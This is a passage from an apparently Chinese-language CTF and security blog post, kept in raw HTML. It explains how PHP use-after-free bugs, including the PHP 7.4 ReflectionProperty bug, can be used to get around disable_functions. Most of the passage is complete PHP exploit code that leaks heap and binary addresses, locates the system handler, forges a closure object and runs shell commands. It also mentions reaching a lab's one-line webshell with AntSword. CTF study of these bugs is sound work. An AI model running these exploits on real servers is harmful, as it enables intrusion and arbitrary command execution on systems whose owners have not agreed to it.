class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h3 id="PHP7-ReflectionProperty-UAF"><a href="#PHP7-ReflectionProperty-UAF" class="headerlink" title="PHP7  ReflectionProperty UAF"></a>PHP7  ReflectionProperty UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>PHP在创建ReflectionProperty 类之后，使用<code>$rp-&gt;getType()-&gt;getName()</code>这个调用指向的是一个已经被 free 的内存地址，便可以触发UAF。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=79820">https://bugs.php.net/bug.php?id=79820</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本：7.4 &lt;= 7.4.8</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>羊城杯CTF-Break_The_Wall：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gwht/2020YCBCTF/blob/main/wp/web/break_the_wall/break_the_wall.tar.gz">https://github.com/gwht/2020YCBCTF/blob/main/wp/web/break_the_wall/break_the_wall.tar.gz</a></p>
<p><strong>靶场突破</strong>：</p>
<p>访问靶场地址：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/69OUkzFxSTZhrIR.png" alt="image-20220110002930565"></p>
<p>十分明显的一个一句话木马，不过要想蚁剑去连接还需要构造一下payload：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/9YixvndfLFTwjyl.png" alt="image-20220110003146545"></p>
<p>但连接后才发现没有任何权限</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/9wJmhFdu1DrCs5v.png" alt="image-20220110003329883"></p>
<p>这就只能对WebShell上进行代码执行，触发UAF了</p>
<p>直接放出官方的EXP，具体的解题思路请查看官方的WP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> HelperHelperHelperHelperHelperHelperHelper <span class="variable">$prop</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelperHelperHelperHelperHelperHelperHelper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>;</span><br><span class="line">&#125;，</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2n</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">4</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line"><span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="number">4</span> + <span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2b</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$offset</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> hex2bin(str_pad(dechex(s2n(<span class="variable">$str</span>) + <span class="variable">$offset</span> - <span class="number">0x10</span>), <span class="number">8</span>, <span class="string">&quot;0&quot;</span>,</span><br><span class="line">STR_PAD_LEFT));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$offset</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">8</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$data</span> .= <span class="variable">$abc</span>[<span class="variable">$offset</span> + <span class="number">7</span> - <span class="variable">$i</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$helper</span>;</span><br><span class="line">write(<span class="number">0x20</span>, <span class="variable">$address</span>);</span><br><span class="line"><span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;b);</span><br><span class="line"><span class="variable">$leak</span> = dechex(<span class="variable">$leak</span>);</span><br><span class="line"><span class="variable">$leak</span> = str_pad(<span class="variable">$leak</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line"><span class="variable">$leak</span> = hex2bin(<span class="variable">$leak</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>;</span><br><span class="line"><span class="variable">$data</span> = str_pad(<span class="variable">$data</span>, <span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>, STR_PAD_LEFT);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">8</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$abc</span>[<span class="variable">$offset</span> + <span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="number">7</span> - <span class="variable">$i</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$std_object_handlers</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$prefix</span> = substr(<span class="variable">$std_object_handlers</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$std_object_handlers</span> = hexdec(bin2hex(<span class="variable">$std_object_handlers</span>));</span><br><span class="line"><span class="variable">$start</span> = <span class="variable">$std_object_handlers</span> &amp; <span class="number">0x00000000fffff000</span> | <span class="number">0x0000000000000920</span>; <span class="comment"># change 0x920 if finding failed</span></span><br><span class="line"><span class="variable">$NumPrefix</span> = <span class="variable">$std_object_handlers</span> &amp; <span class="number">0x0000ffffff000000</span>;</span><br><span class="line"><span class="variable">$NumPrefix</span> = <span class="variable">$NumPrefix</span> - <span class="number">0x0000000001000000</span>;</span><br><span class="line"><span class="variable">$funcs</span> = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$name_addr</span> = bin2hex(leak2(<span class="variable">$prefix</span> . hex2bin(str_pad(dechex(<span class="variable">$addr</span> - <span class="number">0x10</span>), <span class="number">8</span>,</span><br><span class="line"><span class="string">&quot;0&quot;</span>, STR_PAD_LEFT))));</span><br><span class="line"><span class="keyword">if</span> (hexdec(<span class="variable">$name_addr</span>) &gt; <span class="variable">$std_object_handlers</span> || hexdec(<span class="variable">$name_addr</span>) &lt; <span class="variable">$NumPrefix</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name_addr</span> = str_pad(<span class="variable">$name_addr</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line"><span class="variable">$name</span> = strrev(leak2(<span class="variable">$prefix</span> . s2b(hex2bin(<span class="variable">$name_addr</span>), <span class="number">0x00</span>)));</span><br><span class="line"><span class="variable">$name</span> = explode(<span class="string">&quot;\x00&quot;</span>, <span class="variable">$name</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$name</span>, <span class="variable">$funcs</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> [<span class="variable">$name</span>, bin2hex(<span class="variable">$prefix</span>) . str_pad(dechex(<span class="variable">$addr</span>), <span class="number">8</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT),</span><br><span class="line"><span class="variable">$std_object_handlers</span>, <span class="variable">$NumPrefix</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params"><span class="variable">$unknown_func</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$unknown_addr</span> = hex2bin(<span class="variable">$unknown_func</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$prefix</span> = substr(<span class="variable">$unknown_addr</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$unknown_addr</span> = hexdec(<span class="variable">$unknown_func</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$start</span> = <span class="variable">$unknown_addr</span> &amp; <span class="number">0x00000000ffffffff</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">0x800</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x20</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$name_addr</span> = bin2hex(leak2(<span class="variable">$prefix</span> . hex2bin(str_pad(dechex(<span class="variable">$addr</span> - <span class="number">0x10</span>), <span class="number">8</span>,</span><br><span class="line"><span class="string">&quot;0&quot;</span>, STR_PAD_LEFT))));</span><br><span class="line"><span class="keyword">if</span> (hexdec(<span class="variable">$name_addr</span>) &gt; <span class="variable">$unknown_func</span>[<span class="number">2</span>] || hexdec(<span class="variable">$name_addr</span>) &lt;</span><br><span class="line"><span class="variable">$unknown_func</span>[<span class="number">3</span>]) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name_addr</span> = str_pad(<span class="variable">$name_addr</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line"><span class="variable">$name</span> = strrev(leak2(<span class="variable">$prefix</span> . s2b(hex2bin(<span class="variable">$name_addr</span>), <span class="number">0x00</span>)));</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$name</span>, <span class="string">&quot;system&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> bin2hex(leak2(<span class="variable">$prefix</span> . hex2bin(str_pad(dechex(<span class="variable">$addr</span> - <span class="number">0x10</span> + <span class="number">0x08</span>), <span class="number">8</span>,</span><br><span class="line"><span class="string">&quot;0&quot;</span>, STR_PAD_LEFT))));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">0x800</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> + <span class="number">0x20</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$name_addr</span> = bin2hex(leak2(<span class="variable">$prefix</span> . hex2bin(str_pad(dechex(<span class="variable">$addr</span> - <span class="number">0x10</span>), <span class="number">8</span>,</span><br><span class="line"><span class="string">&quot;0&quot;</span>, STR_PAD_LEFT))));</span><br><span class="line"><span class="keyword">if</span> (hexdec(<span class="variable">$name_addr</span>) &gt; <span class="variable">$unknown_func</span>[<span class="number">2</span>] || hexdec(<span class="variable">$name_addr</span>) &lt;</span><br><span class="line"><span class="variable">$unknown_func</span>[<span class="number">3</span>]) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name_addr</span> = str_pad(<span class="variable">$name_addr</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line"><span class="variable">$name</span> = strrev(leak2(<span class="variable">$prefix</span> . s2b(hex2bin(<span class="variable">$name_addr</span>), <span class="number">0x00</span>)));</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$name</span>, <span class="string">&quot;system&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> bin2hex(leak2(<span class="variable">$prefix</span> . hex2bin(str_pad(dechex(<span class="variable">$addr</span> - <span class="number">0x10</span> + <span class="number">0x08</span>), <span class="number">8</span>,</span><br><span class="line"><span class="string">&quot;0&quot;</span>, STR_PAD_LEFT))));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rp</span> = <span class="keyword">new</span> ReflectionProperty(Test::class, <span class="string">&#x27;prop&#x27;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$test</span> -&gt; prop = <span class="keyword">new</span> HelperHelperHelperHelperHelperHelperHelper;</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$rp</span> -&gt; getType() -&gt; getName();</span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> HelperHelperHelperHelperHelperHelperHelper();</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$abc</span>) &lt; <span class="number">1000</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;UAF Failed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$helper</span> -&gt; a = <span class="variable">$helper</span>;</span><br><span class="line"><span class="variable">$php_heap</span> = leak(<span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$helper</span> -&gt; a = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="variable">$std_object_handlers</span> = leak(<span class="number">0x0</span>);</span><br><span class="line"><span class="variable">$prefix</span> = substr(<span class="variable">$php_heap</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Helper Object Address: &quot;</span> . bin2hex(<span class="variable">$php_heap</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;std_object_handlers Address: &quot;</span> . bin2hex(<span class="variable">$std_object_handlers</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$closure_object</span> = leak(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Closure Object: &quot;</span> . bin2hex(<span class="variable">$closure_object</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">write(<span class="number">0x28</span>, <span class="string">&quot;\x06&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$unknown_func</span> = get_basic_funcs(<span class="variable">$std_object_handlers</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine funcs address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Find func&#x27;s adress: &quot;</span> . <span class="variable">$unknown_func</span>[<span class="number">1</span>] . <span class="string">&quot; -&gt; &quot;</span> . <span class="variable">$unknown_func</span>[<span class="number">0</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$system_address</span> = getSystem(<span class="variable">$unknown_func</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo &quot;Find system&#x27;s handler: &quot; . $system_address . &quot;\n&quot;;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">write(<span class="number">0x308</span> + <span class="number">0x08</span> * (<span class="variable">$i</span> + <span class="number">1</span>), leak2(<span class="variable">$prefix</span> . s2b(<span class="variable">$closure_object</span>, <span class="number">0x08</span> *</span><br><span class="line"><span class="variable">$i</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$abc</span>[<span class="number">0x308</span> + <span class="number">0x40</span>] = <span class="string">&quot;\x01&quot;</span>;</span><br><span class="line">write(<span class="number">0x308</span> + <span class="number">0x70</span>, hex2bin(<span class="variable">$system_address</span>));</span><br><span class="line">write(<span class="number">0x10</span>, <span class="variable">$prefix</span> . hex2bin(dechex(s2n(<span class="variable">$php_heap</span>) + <span class="number">0x18</span> + <span class="number">0x308</span> + <span class="number">0x08</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fake Closure Object Address: &quot;</span> . bin2hex(<span class="variable">$prefix</span> .</span><br><span class="line">hex2bin(str_pad(dechex(s2n(<span class="variable">$php_heap</span>) + <span class="number">0x18</span> + <span class="number">0x308</span> + <span class="number">0x08</span>), <span class="number">8</span>, <span class="string">&quot;0&quot;</span>,</span><br><span class="line">STR_PAD_LEFT))) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">(<span class="variable">$helper</span> -&gt; a)(<span class="string">&quot;/readflag&quot;</span>);	<span class="comment">// 需要执行的命令</span></span><br></pre></td></tr></table></figure>
